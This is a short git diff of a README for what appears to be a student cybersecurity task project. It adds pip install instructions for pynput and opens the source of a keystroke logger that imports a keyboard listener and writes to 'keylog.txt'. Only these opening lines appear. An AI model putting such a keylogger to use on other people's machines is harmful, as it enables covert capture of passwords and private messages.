@@ -1,3 +1,11 @@
+# INSTALL REQUIRED PACKAGE:
+
+If you haven't installed pynput, you'll need to install it using pip:
+
+<img width="552" alt="Screenshot 2024-06-23 at 11 50 09 AM" src="https://github.com/VigneshwaranElakiya/PRODIGY_CS_04/assets/169158514/14d1c319-a0a9-46a3-80b0-f845ac413b2a">
+
+# SOURCE CODE:
+    
     from pynput.keyboard import Key, Listener
 
     log_file = "keylog.txt"
